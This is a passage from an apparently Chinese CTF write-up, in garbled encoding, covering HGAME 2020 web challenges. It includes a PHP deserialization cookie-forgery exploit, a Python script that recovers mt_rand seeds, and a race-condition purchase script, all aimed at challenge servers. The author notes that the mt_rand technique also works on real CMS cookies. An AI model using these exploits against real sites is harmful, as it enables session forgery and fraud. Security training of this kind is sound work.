   public function Fight($monster){        if($monster[&#39;no&#39;] &gt;= $this-&gt;rank){            $this-&gt;rank -= rand(5, 15);            if($this-&gt;rank &lt;= 2){                $this-&gt;rank = 2;            }            $_SESSION[&#39;exp&#39;] += rand(20, 200);            return array(                &#39;result&#39; =&gt; true,                 &#39;msg&#39; =&gt; &#39;&lt;span style=&quot;color:green;&quot;&gt;Congratulations! You win! &lt;/span&gt;&#39;            );        }else{            return array(                &#39;result&#39; =&gt; false,                 &#39;msg&#39; =&gt; &#39;&lt;span style=&quot;color:red;&quot;&gt;You die!&lt;/span&gt;&#39;            );        }    }    public function __destruct(){        // ç¡®ä¿ç¨‹åºæ˜¯è·‘åœ¨æœåŠ¡å™¨ä¸Šçš„ï¼        $this-&gt;serverKey = $_SERVER[&#39;key&#39;];        if($this-&gt;key === $this-&gt;serverKey){            $_SESSION[&#39;rank&#39;] = $this-&gt;rank;        }else{            // éæ­£å¸¸è®¿é—®            session_start();            session_destroy();            setcookie(&#39;monster&#39;, &#39;&#39;);            header(&#39;Location: index.php&#39;);            exit;        }    }}class Monster{    private $monsterData;    private $encryptKey;    public function __construct($key){        $this-&gt;encryptKey = $key;        if(!isset($_COOKIE[&#39;monster&#39;])){            $this-&gt;Set();            return;        }        $monsterData = base64_decode($_COOKIE[&#39;monster&#39;]);        if(strlen($monsterData) &gt; 32){            $sign = substr($monsterData, -32);            $monsterData = substr($monsterData, 0, strlen($monsterData) - 32);            if(md5($monsterData . $this-&gt;encryptKey) === $sign){                $this-&gt;monsterData = unserialize($monsterData);            }else{                session_start();                session_destroy();                setcookie(&#39;monster&#39;, &#39;&#39;);                header(&#39;Location: index.php&#39;);                exit;            }        }        $this-&gt;Set();         }    public function Set(){        $monsterName = [&#39;æ— åå°æ€ª&#39;, &#39;BOSS: The Kernal Cosmos&#39;, &#39;å°æ€ª: Big Eggplant&#39;, &#39;BOSS: The Mole King&#39;, &#39;BOSS: Zero Zone Witch&#39;];        $this-&gt;monsterData = array(            &#39;name&#39; =&gt; $monsterName[array_rand($monsterName, 1)],            &#39;no&#39; =&gt; rand(1, 2000),        );        $this-&gt;Save();    }    public function Get(){        return $this-&gt;monsterData;    }    private function Save(){        $sign = md5(serialize($this-&gt;monsterData) . $this-&gt;encryptKey);        setcookie(&#39;monster&#39;, base64_encode(serialize($this-&gt;monsterData) . $sign));    }}</code></pre><p>ä¸‰ä¸ªæ•´é½çš„ç±»ï¼Œæ˜¾ç„¶æ˜¯phpååºåˆ—åŒ–äº†ã€‚é¦–å…ˆæ•´ç†ä¸‹æ€è·¯ï¼Œæˆ‘ä»¬è¾“å…¥åå­—åå¼€å§‹æ¸¸æˆï¼Œè¿™æ—¶åªè¦<code>$game-&gt;rank-&gt;Get() === 1</code>å³å¯æ‹¿åˆ°flagã€‚é‚£ä¹ˆé¦–å…ˆè·Ÿéšä¸‹æµç¨‹å§ã€‚</p><p>é‡ç‚¹å…ˆæ”¾åœ¨cardinal.phpä¸Šã€‚è¾“å…¥åå­—åï¼Œä¼šå®ä¾‹åŒ–Gameå¯¹è±¡ï¼Œè€Œåœ¨Gameç±»ä¸­ï¼Œå…ˆåå®ä¾‹åŒ–Monsterç±»ä¸Rankç±»å¯¹è±¡ã€‚å…¶ä¸­monsterç±»çš„å®ä¾‹åŒ–ç”¨åˆ°äº†ä¸€ä¸ª<code>init()</code>å‡½æ•°ã€‚é‡ç‚¹å…³æ³¨ä¸‹è¿™æ®µä»£ç </p><pre><code class="php">private function init($data){        foreach($data as $key =&gt; $value){            $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value);            $this-&gt;sign .= md5($this-&gt;sign . $value);        }    }</code></pre><p>è¿™é‡Œçš„<code>sprintf()</code>å‡½æ•°å¯ä»¥åˆ©ç”¨ã€‚ç”±äºsprintf()ä½œç”¨æ˜¯å°†æ ¼å¼åŒ–å­—ç¬¦ä¸²å†™å…¥å˜é‡ä¸­,ç¬¬ä¸€æ¬¡å¾ªç¯<code>$playername</code>æœ‰å€¼ï¼Œåˆ™å°†å€¼å†™å…¥%sï¼Œå¾ªç¯ç»“æŸï¼Œå¦‚æœå¾ªç¯çš„æ˜¯%såˆ™è¿›å…¥ä¸‹ä¸€æ¬¡å¾ªç¯ã€‚æ‰€ä»¥æ‰€è°“çš„<code>$encryptkey</code>å¯ä»¥ç›´æ¥å¾—åˆ°ã€‚è¾“å…¥åå­—ä¸º%så³å¯ã€‚<br>è¿™ç‚¹æ˜¯éƒå¸ˆå‚…æåˆ°ï¼Œddctf2019 webç­¾åˆ°ä¸­å‡ºç°è¿‡ï¼ŒåŒ…æ‹¬ä¸‹é¢ä¸€éƒ¨åˆ†ä¹Ÿè·Ÿé‚£é“é¢˜æœ‰å…³ï¼Œæ‰€ä»¥æˆ‘æ‰èƒ½ç»•è¿‡è¿™ç‚¹ã€‚<br><img src="/2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="key"><br>æ¥ç€æ³¨æ„åˆ°ä¸‹é¢,åœ¨å¾ªç¯è¿‡åï¼Œæˆ‘ä»¬çš„å¾ªç¯ç»“æœ<code>$value</code>ç»è¿‡äº†ä¸€æ¬¡MD5,ç”¨äºmonsterçš„å®ä¾‹åŒ–äº†ã€‚é‚£ä¹ˆè·Ÿè¿›monsterç±»ï¼Œå‘ç°é‡è¦ä»£ç </p><pre><code class="php">$monsterData = base64_decode($_COOKIE[&#39;monster&#39;]);        if(strlen($monsterData) &gt; 32){            $sign = substr($monsterData, -32);            $monsterData = substr($monsterData, 0, strlen($monsterData) - 32);            if(md5($monsterData . $this-&gt;encryptKey) === $sign){                $this-&gt;monsterData = unserialize($monsterData);            }else{                session_start();                session_destroy();                setcookie(&#39;monster&#39;, &#39;&#39;);                header(&#39;Location: index.php&#39;);                exit;            }        }</code></pre><p>åŸæ¥monsteræ˜¯ä½œä¸ºcookieè¢«å­˜å‚¨èµ·æ¥çš„ï¼Œä¸”åªè¦æˆ‘ä»¬çš„monstercookieæ»¡è¶³æ¡ä»¶ï¼Œå°±æœ‰ä¸€ä¸ªååºåˆ—åŒ–åˆ©ç”¨ã€‚æ‰€ä»¥å…³æ³¨ä¸‹monosterçš„cookieçš„å­˜å‚¨æ–¹å¼</p><pre><code class="php">private function Save(){        $sign = md5(serialize($this-&gt;monsterData) . $this-&gt;encryptKey);        setcookie(&#39;monster&#39;, base64_encode(serialize($this-&gt;monsterData) . $sign));    }</code></pre><p>äº†è§£åˆ°åŠ å¯†æ–¹å¼ï¼Œå°±æ˜ç™½äº†æˆ‘ä»¬çš„ååºåˆ—åŒ–ç”Ÿæ•ˆæ–¹æ³•äº†ï¼šæˆ‘ä»¬è¾“å…¥åå­—åï¼Œä¼ªé€ cookieï¼Œä»è€Œæ‰§è¡Œååºåˆ—åŒ–ä½¿Rankç±»ä¸­çš„<code>$rank</code>ä¸º1ï¼Œæ‹¿åˆ°flagã€‚<br>æ‰€ä»¥expå¦‚ä¸‹ï¼Œæ³¨æ„monsterç±»ä¸­çš„<code>$encryptley</code>ä¸æ˜¯Gameç±»ä¸­çš„çš„keyã€‚è€Œæ˜¯ç»è¿‡åå­—foreachååˆmd5äº†ä¸€ä¸‹ï¼Œä¼ è¿›Monsterç±»ä¸­çš„ï¼›å¦å¤–Rankç±»ä¸­çš„<code>_destruct()</code>ä¹Ÿè¦ç»•è¿‡å•Šã€‚æˆ‘ç›´æ¥æŠŠdestructç±»æ‰”æ‰åå¿˜è®°æ”¹<code>_construct()</code>hh</p><pre><code class="php">&lt;?phpclass Rank{    private $rank = 1;    private $serverKey;    private $key;    public function __construct()    {        $this-&gt;key = &amp;$this-&gt;serverKey;    }}$Game_encryptKey = &#39;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#39;;$Game_data = [&#39;byc_404&#39;, $Game_encryptKey];$Monster_encryptKey = &#39;&#39;;foreach($Game_data as $key =&gt; $value){    $Monster_encryptKey .= md5($Monster_encryptKey . $value);}$a = new Rank();$sign = md5(serialize($a) . $Monster_encryptKey);$cookie = base64_encode(serialize($a) . $sign);echo $cookie;</code></pre><p><img src="/2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p><h1 id="äºŒå‘å…¥é­‚ï¼"><a href="#äºŒå‘å…¥é­‚ï¼" class="headerlink" title="äºŒå‘å…¥é­‚ï¼"></a>äºŒå‘å…¥é­‚ï¼</h1><p>æœ‰ä¸€è¯´ä¸€ï¼Œè™½ç„¶è¿™é¢˜ç¬¬11ä¸ªåšå‡ºæ¥æŒºé«˜å…´çš„ï¼Œä½†æ˜¯åŸºæœ¬æ²¡å•¥æ”¶è·ã€‚é¢˜ç›®æè¿°ä¹Ÿä¸æ¸…æ¥šï¼Œæ¼æ´åˆ©ç”¨æœ‰ç‚¹é¸¡è‚‹ï¼Œåšé¢˜æ—¶å®Œå…¨åŒ–èº«è„šæœ¬å°å­ã€‚æ€»è€Œè¨€ä¹‹ä¸çŸ¥é“å‡ºé¢˜äººçš„æ„å›¾æ˜¯å•¥ï¼Œwebé¢˜ä¸è¯¥æ˜¯è¿™ç§ç±»å‹çš„å§ã€‚</p><p>é¦–å…ˆåˆ¤æ–­æ¼æ´ç±»å‹ã€‚è¿›å…¥é¡µé¢å‘ç°æŠ½å¡æ•°ä¸cdkeyè¿™ä¸¤ä¸ªæäº¤æ¡†ã€‚æŠ½å¡æ—¶ä¼šå‡ºç°ä¸€å¤§ä¸²éšæœºæ•°ã€‚cdkeyæ²¡è¯´æ˜è¦æäº¤å•¥ã€‚æäº¤æ—¶ä¼šè¯´æ˜å€¼é”™è¯¯æˆ–è€…æ…¢äº2sã€‚<br>æ‰“å¼€æºç å‘ç°æç¤ºphp5ï¼Œå¯ä»¥è”æƒ³åˆ°æ˜¯php5ä¼ªéšæœºæ•°æ¼æ´(å®é™…ä¸Šå„ä¸ªç‰ˆæœ¬çš„phpéƒ½æœ‰è¿™ä¸€æ¼æ´ï¼Œåªä¸è¿‡5ä¸7æœ‰åŒºåˆ«)ã€‚ä¹‹å‰åœ¨GWCTFä¸Šæ›¾ç»ä½œä¸ºwebç­¾åˆ°é¢˜åšè¿‡ï¼Œæ˜¯å…³äº<code>mt_rand()</code>è¿™ä¸€å‡½æ•°çš„ã€‚<br>æ¼æ´å³åœ¨äºéšæœºæ•°é’Ÿå­è®¾å®šæ—¶ï¼Œäº§ç”Ÿçš„éšæœºæ•°åºåˆ—æ˜¯å›ºå®šçš„ã€‚æ•…å¯ä»¥æ ¹æ®éšæœºæ•°åºåˆ—å€’æ¨ç§å­æˆ–è€…æ ¹æ®ç§å­å»æ¨éšæœºæ•°åºåˆ—ã€‚å¸¸å¸¸ç”¨ä»¥ä¸‹ä»£ç æµ‹è¯•ï¼š</p><pre><code>mt_srand(123);for($i=0;$i&lt;3;$i++){ echo mt_rand().&quot; &quot;;}</code></pre><p>å…·ä½“ç ´è§£æ–¹æ³•ä¸»è¦é å·¥å…·ï¼Œå³<code>php_mt_seed</code>ï¼Œä¼°è®°éƒ½ç”¨è¿‡ã€‚å¯ä»¥æ ¹æ®ä¸€ä¸ªæ•°å€’æ¨å‡ºå„ä¸ªphpç‰ˆæœ¬ä¸‹çš„éšæœºæ•°ç§å­ã€‚ä½†æ˜¯é—®é¢˜åœ¨äºé¢˜ç›®çš„ç§å­æ˜¾ç„¶æ˜¯åŠ¨æ€æ›´æ–°çš„ï¼Œä¸”åŸºæœ¬ä¸è¶…è¿‡2sã€‚ç›¸æ¯”GWCTFåªè·Ÿsessionæœ‰å…³çš„é™æ€ç§å­ï¼Œæœ¬é¢˜çš„æ›´æ–°é€Ÿåº¦è¿«ä½¿æˆ‘ä»¬åªèƒ½é è„šæœ¬è§£å†³ã€‚<br>æœæ–­ä¸Šgoogleæ‰¾ç›¸å…³æ–‡ç« ï¼Œè¿™ç¯‡æ–‡ç« å¸å¼•åˆ°æˆ‘çš„æ³¨æ„ï¼š<a href="https://www.ambionics.io/blog/php-mt-rand-prediction" target="_blank" rel="noopener">https://www.ambionics.io/blog/php-mt-rand-prediction</a><br>æ–‡ç« çš„å‰¯æ ‡é¢˜è¯´æ˜ï¼Œå¯ä»¥åªé€šè¿‡ä¸¤ä¸ªå€¼ä¸”å¹¶éæš´åŠ›ç ´è§£çš„æ–¹å¼å¾—åˆ°ç§å­ã€‚äºæ˜¯è¯»äº†ä¸‹æ–‡ç« ï¼Œå‘ç°è¯»ä¸æ‡‚ï¼Œçº¯ç®—æ³•å±‚é¢ã€‚å¥½åœ¨ç»™å‡ºäº†è„šæœ¬<br><a href="https://github.com/ambionics/mt_rand-reverse" target="_blank" rel="noopener">https://github.com/ambionics/mt_rand-reverse</a><br>åŠä½¿ç”¨æ–¹æ³•<br><img src="/2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="è„šæœ¬"><br>é‡Œé¢ä¸€ä¸ªphpè„šæœ¬ç”¨äºç”Ÿæˆéšæœºæ•°ï¼Œå…¶ä¸­ä¸¤ä¸ªå‚æ•°ä¸€ä¸ªä¸ºç§å­ï¼Œå¦ä¸€ä¸ªä¸ºåç§»é‡ï¼Œå¦‚æœ<code>offset</code>è®¾ä¸º0ï¼Œåˆ™è¾“å‡ºçš„æ˜¯ä»¥è¾“å…¥ç§å­ç”Ÿæˆçš„ç¬¬1ä¸ªå’Œç¬¬228ä¸ªéšæœºæ•°ï¼›pythonè„šæœ¬ç”¨äºè§£éšæœºæ•°ï¼Œå…±å››ä¸ªå‚æ•°ï¼Œå‰é¢phpè„šæœ¬ç”Ÿæˆçš„ä¸¤ä¸ªéšæœºæ•°ï¼Œä¸€ä¸ªåç§»é‡åŒä¸Šï¼ŒåŠ ä¸Šä¸€ä¸ªå€¼ä¸º0/1çš„ç”¨äºåˆ¤åˆ«phpç‰ˆæœ¬çš„å‚æ•°ã€‚0ä¸ºphp5,1ä¸ºphp7</p><p>æ‰€ä»¥æˆ‘å°è¯•æ‹¿æœ¬åœ°çš„ä¸€ç»„æ•°æ®åœ¨è™šæ‹Ÿæœºé‡Œè¯•ä¸‹ï¼Œå‘ç°å¾ˆå¿«èƒ½æ‹¿åˆ°ç»“æœç§å­123ï¼Œ</p><pre><code>python3 reverse_mt_rand.py   644748169  126568735  0   0</code></pre><p>å¯èƒ½å°±æ˜¯æˆ‘è¦çš„è„šæœ¬ã€‚<br>æ‰€ä»¥æ€è·¯å¦‚ä¸‹ï¼Œåœ¨è„šæœ¬ä¸­ç»™æŠ½å¡æ¬¡æ•°ä¼ ä¸º228ï¼Œè·å–ç¬¬ä¸€ä¸ªå’Œç¬¬227ä¸ªéšæœºæ•°ï¼Œä¼ ç»™è„šæœ¬ï¼Œå¦ä¸¤ä¸ªå‚æ•°ç›´æ¥è®¾ä¸º<code>0 0</code>æ‰§è¡Œï¼Œç»“æœå¼€å§‹ç¿»è½¦ã€‚ä¸»è¦æ˜¯è‡ªå·±ä¸ç†Ÿæ‚‰osåº“å§ï¼Œæƒ³è¦ç›´æ¥åœ¨ä¸€ä¸ªè„šæœ¬é‡Œè°ƒç”¨å¦ä¸€ä¸ªè„šæœ¬ï¼Œè™½ç„¶ç»“æœæ˜¯å¯¹çš„ä½†å°±æ˜¯æ‹¿ä¸åˆ°flagã€‚äºæ˜¯ç›´æ¥æ”¹è¿™ä¸ªè§£å¯†è„šæœ¬<br>(ä¸»è¦æ˜¯æŠŠ<code>main()</code>æ”¹æˆè¿”å›intå€¼,åŸæœ¬æ˜¯ç›´æ¥<code>print</code>çš„)ã€‚</p><pre><code class="python">import randomimport requestsimport reimport timetime_start=time.time()url = &#39;https://twoshot.hgame.n3ko.co/random.php?times=228&#39;url1 = &#39;https://twoshot.hgame.n3ko.co/verify.php&#39;s = requests.session()res = s.get(url)key = res.textkey = key.replace(&#39;[&#39;, &#39;&#39;)key = key.replace(&#39;]&#39;, &#39;,&#39;)ans = re.findall(r&#39;(.*?)\,&#39;, key)arg1=ans[0]arg2=ans[227]print(arg1)print(arg2)#ä»¥ä¸‹ä¸ºåŸè„šæœ¬N = 624M = 397MAX = 0xffffffffMOD = MAX + 1# STATE_MULT * STATE_MULT_INV = 1 (mod MOD)STATE_MULT = 1812433253STATE_MULT_INV = 2520285293MT_RAND_MT19937 = 1MT_RAND_PHP = 0def php_mt_initialize(seed):    &quot;&quot;&quot;Creates the initial state array from a seed.    &quot;&quot;&quot;    state = [None] * N    state[0] = seed &amp; 0xffffffff;    for i in range(1, N):        r = state[i - 1]        state[i] = (STATE_MULT * (r ^ (r &gt;&gt; 30)) + i) &amp; MAX    return statedef undo_php_mt_initialize(s, p):    &quot;&quot;&quot;From an initial state value `s` at position `p`, find out seed.    &quot;&quot;&quot;    # We have:    # state[i] = (1812433253U * ( state[i-1] ^ (state[i-1] &gt;&gt; 30) + i )) % 100000000    # and:    # (2520285293 * 1812433253) % 100000000 = 1 (Modular mult. inverse)    # =&gt; 2520285293 * (state[i] - i) = ( state[i-1] ^ (state[i-1] &gt;&gt; 30) ) (mod 100000000)    for i in range(p, 0, -1):        s = _undo_php_mt_initialize(s, i)    return sdef _undo_php_mt_initialize(s, i):    s = (STATE_MULT_INV * (s - i)) &amp; MAX    return s ^ s &gt;&gt; 30def php_mt_rand(s1):    &quot;&quot;&quot;Converts a merged state value `s1` into a random value, then sent to the    user.    &quot;&quot;&quot;    s1 ^= (s1 &gt;&gt; 11)    s1 ^= (s1 &lt;&lt; 7) &amp; 0x9d2c5680    s1 ^= (s1 &lt;&lt; 15) &amp; 0xefc60000    s1 ^= (s1 &gt;&gt; 18)    return s1def undo_php_mt_rand(s1):    &quot;&quot;&quot;Retrieves the merged state value from the value sent to the user.    &quot;&quot;&quot;    s1 ^= (s1 &gt;&gt; 18)    s1 ^= (s1 &lt;&lt; 15) &amp; 0xefc60000    s1 = undo_lshift_xor_mask(s1, 7, 0x9d2c5680)    s1 ^= s1 &gt;&gt; 11    s1 ^= s1 &gt;&gt; 22    return s1def undo_lshift_xor_mask(v, shift, mask):    &quot;&quot;&quot;r s.t. v = r ^ ((r &lt;&lt; shift) &amp; mask)    &quot;&quot;&quot;    for i in range(shift, 32, shift):        v ^= (bits(v, i - shift, shift) &amp; bits(mask, i, shift)) &lt;&lt; i    return vdef bits(v, start, size):    return lobits(v &gt;&gt; start, size)def lobits(v, b):    return v &amp; ((1 &lt;&lt; b) - 1)def bit(v, b):    return v &amp; (1 &lt;&lt; b)def bv(v, b):    return bit(v, b) &gt;&gt; bdef php_mt_reload(state, flavour):    s = state    for i in range(0, N - M):        s[i] = _twist_php(s[i + M], s[i], s[i + 1], flavour)    for i in range(N - M, N - 1):        s[i] = _twist_php(s[i + M - N], s[i], s[i + 1], flavour)def _twist_php(m, u, v, flavour):    &quot;&quot;&quot;Emulates the `twist` and `twist_php` #defines.    &quot;&quot;&quot;    mask = 0x9908b0df if (u if flavour == MT_RAND_PHP else v) &amp; 1 else 0    return m ^ (((u &amp; 0x80000000) | (v &amp; 0x7FFFFFFF)) &gt;&gt; 1) ^ maskdef undo_php_mt_reload(S000, S227, offset, flavour):    # define twist_php(m,u,v)  (m ^ (mixBits(u,v)&gt;&gt;1) ^ ((uint32_t)(-(int32_t)(loBit(u))) &amp; 0x9908b0dfU))    # m S000    # u S227    # v S228    X = S000 ^ S227    # This means the mask was applied, and as such that S227&#39;s LSB is 1    s22X_0 = bv(X, 31)    # remove mask if present    if s22X_0:        X ^= 0x9908b0df    # Another easy guess    s227_31 = bv(X, 30)    # remove bit if present    if s227_31:        X ^= 1 &lt;&lt; 30    # We&#39;re missing bit 0 and bit 31 here, so we have to try every possibility    s228_1_30 = (X &lt;&lt; 1)    for s228_0 in range(2):        for s228_31 in range(2):            if flavour == MT_RAND_MT19937 and s22X_0 != s228_0:                continue            s228 = s228_0 | s228_31 &lt;&lt; 31 | s228_1_30            # Check if the results are consistent with the known bits of s227            s227 = _undo_php_mt_initialize(s228, 228 + offset)            if flavour == MT_RAND_PHP and bv(s227, 0) != s22X_0:                continue            if bv(s227, 31) != s227_31:                continue            # Check if the guessed seed yields S000 as its first scrambled state            rand = undo_php_mt_initialize(s228, 228 + offset)            state = php_mt_initialize(rand)            php_mt_reload(state, flavour)            if not (S000 == state[offset]):                continue            return rand    return Nonedef main(_R000, _R227, offset, flavour):    # Both were &gt;&gt; 1, so the leftmost byte is unknown    _R000 &lt;&lt;= 1    _R227 &lt;&lt;= 1    for R000_0 in range(2):        for R227_0 in range(2):            R000 = _R000 | R000_0            R227 = _R227 | R227_0            S000 = undo_php_mt_rand(R000)            S227 = undo_php_mt_rand(R227)            seed = undo_php_mt_reload(S000, S227, offset, flavour)            if seed:                return seedseed=main(int(arg1), int(arg2), 0, 0)print(seed)data={    &#39;ans&#39;:seed}res1=s.post(url1,data)print(res1.text)time_end=time.time()print(&#39;totally cost&#39;,time_end-time_start)</code></pre><p>ä¸ºäº†æ–¹ä¾¿æˆ‘åŠ äº†ä¸ªè®¡æ—¶å™¨è¾“å‡ºè¿è¡Œæ—¶é—´ï¼Œå¯æ˜¯è²Œä¼¼æ—¶é—´çº¦0.3så·¦å³æ—¶ä¹Ÿæ²¡æ‹¿åˆ°flagã€‚å¥½åœ¨è‡ªå·±æ²¡æ”¾å¼ƒä¸€ç›´è¯•ï¼Œåé¢è„šæœ¬è¿è¡Œæ—¶é—´å·®ä¸å¤šä¸€ç›´ä¸º0.18så·¦å³æ—¶æ‹¿åˆ°flagäº†ã€‚å¯èƒ½ä¸€å¼€å§‹è‡ªå·±å†…å­˜è·‘å¤ªæ»¡äº†å§â€¦â€¦<br><img src="/2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p><p>ps:æˆ‘é”™äº†ã€‚åæ¥æ‰å‘ç°è¿™ä¸ªæ´å¾ˆæœ‰ç”¨å¤„ã€‚å› ä¸ºå¾ˆå¤šcmsçš„cookieæ˜¯ç›´æ¥<code>mt_rand()</code>ç”Ÿæˆçš„ã€‚æ‰€ä»¥ä¼ªé€ cookieæ˜¯ä¸€ç§å¦™æ‹›</p><h1 id="Cosmosçš„äºŒæ‰‹å¸‚åœº"><a href="#Cosmosçš„äºŒæ‰‹å¸‚åœº" class="headerlink" title="Cosmosçš„äºŒæ‰‹å¸‚åœº"></a>Cosmosçš„äºŒæ‰‹å¸‚åœº</h1><p> æœ‰äº›ä¸¢è„¸ã€‚èƒ½åšå‡ºæ¥æ˜¯é å¸ˆå‚…çš„æç¤ºã€‚ä¹‹å‰æœ€å¤§çš„é—®é¢˜ä¸»è¦åœ¨äºæ²¡æœ‰è¾¨æå‡ºæ¼æ´æ‰€åœ¨ï¼Œå› æ­¤ä¸å¥½ä¸‹æ‰‹ã€‚åƒè¿™ç±»ä¹°å–ä¸œè¥¿çš„é¢˜ç›®ï¼Œæˆ‘è‡ªå·±çš„è®¤è¯†ä¸»è¦æ¥æºäºhackergame2019çš„è¾¾æ‹‰å´©å§å¤§å†’é™©ã€‚å½“æ—¶é‡Œé¢æ¼æ´ä¹‹å¤„åœ¨äºè‡ªå·±çš„æˆ˜æ–—åŠ›å¯ä»¥ä¸ºè´Ÿæ•°ï¼Œæ‰€ä»¥å¼•ç”³å‡ºè´Ÿæº¢å‡ºã€‚è€Œè¿™é“é¢˜å¼€å§‹æˆ‘ä¹Ÿå½“æˆè´Ÿæº¢å‡ºäº†ï¼Œå®é™…ä¸Šæ˜¯ä¸ªå¤šçº¿ç¨‹ï¼Œæˆ–è®¸å«æ¡ä»¶ç«äº‰æ›´ä¸ºå‡†ç¡®ã€‚</p><p>ç”¨burpé‡å¤å‘åŒ…å–ä¸œè¥¿ï¼ŒåŒæ—¶è‡ªå·±ç”¨pythonè„šæœ¬ä¸æ–­ä¹°ä¸œè¥¿ã€‚åªè¦burpçš„çº¿ç¨‹æ•°å¿«äºpythonçš„ï¼Œå°±å¯ä»¥ä¿è¯é‡‘é’±æ•°åœ¨å¢åŠ ã€‚<br>pyhtonè„šæœ¬</p><pre><code class="python">import requestsimport timeurl=&#39;http://121.36.88.65:9999//API/?method=buy&#39;cookies={&#39;PHPSESSID&#39;:&#39;d0ov3vsd1hpjjf8ofuakhacd0n&#39;}headers={    &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0&#39;}payload={    &#39;code&#39;: &#39;800002&#39;,    &#39;amount&#39;: &#39;30&#39;}for i in range(1,1000000):    res=requests.post(url,data=payload,cookies=cookies,headers=headers)    time.sleep(0.6)</code></pre><p>æ¯”è¾ƒèœï¼Œå¤šçº¿ç¨‹å¿˜å…‰äº†ï¼Œæ‰€ä»¥ç›´æ¥æ¯æ¬¡forå¾ªç¯ç”¨å<code>sleep()</code>ä¸€ä¸‹ã€‚<br>burpç›´æ¥é‡å¤å‘åŒ…ï¼š<br><img src="/2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="payloadè°ƒæˆNullPayloads"><br>æœ€åå¤šè·‘å‡ éï¼Œé’±æ•°å¤Ÿäº†åæ‹¿åˆ°flag<br><img src="/2020/02/02/%E6%9D%AD%E7%94%B5hgame-week3/5.PNG" class="lazyload" data-srcset="5.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p><h1 id="Cosmosçš„ç•™è¨€æ¿-2"><a href="#Cosmosçš„ç•™è¨€æ¿-2" class="headerlink" title="Cosmosçš„ç•™è¨€æ¿-2"></a>Cosmosçš„ç•™è¨€æ¿-2</h1><p>æœ‰ç‚¹å‘ã€‚é¢˜ç›®å‘ä¸åœ¨éš¾åº¦ä¸Šï¼Œä¸»è¦æ˜¯ç¯å¢ƒå¤ªå·®äº†ï¼Œä¼°è®¡å‡ ä¸ªäººä¸€èµ·æ³¨å°±è¦å‡ºé—®é¢˜ã€‚å¥½åœ¨è”ç³»å‡ºé¢˜äººé‡å¯äº†ä¸¤éæ€»ç®—èƒ½åšäº†ï¼Œæ¯•ç«Ÿéƒ½æ˜¯ç”¨çš„å­¦ç”Ÿæœºï¼Œèƒ½ç†è§£çš„ã€‚</p><p>é¦–å…ˆæ˜¯æ‰¾æ¼æ´ã€‚é¢˜ç›®åç§°æ˜æ˜¾æ˜¯week2ç•™è¨€æ¿çš„åç»­ï¼Œä¹Ÿå°±æ˜¯è¯´å¤šåŠæ˜¯sqlæ³¨å…¥ã€‚å¼€å§‹è¿›å»ä¸€ä¸ªç™»å½•æ¡†ï¼Œæä¾›äº†æ³¨å†ŒåŠŸèƒ½ã€‚æ‰€ä»¥å…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ç™»è¿›å»ã€‚æœŸé—´å®¹æ˜“å‘ç°å¯¹ç”¨æˆ·åçš„è¿‡æ»¤å¾ˆä¸¥æ ¼ï¼›è¿›å»åå‘ç°ä¸€ä¸ªç•™è¨€æ¿ã€‚é€šå¸¸ç•™è¨€æ¿å¤šåŠæ˜¯xssæˆ–è€…sqlæ³¨å…¥äº†å§ã€‚äºæ˜¯å°è¯•ç•™å‡ ä¸ªè¨€ã€‚å‘ç°éƒ½ä¸è¡Œã€‚è¿™æ—¶æ³¨æ„åˆ°ä¸€ä¸ªåˆ 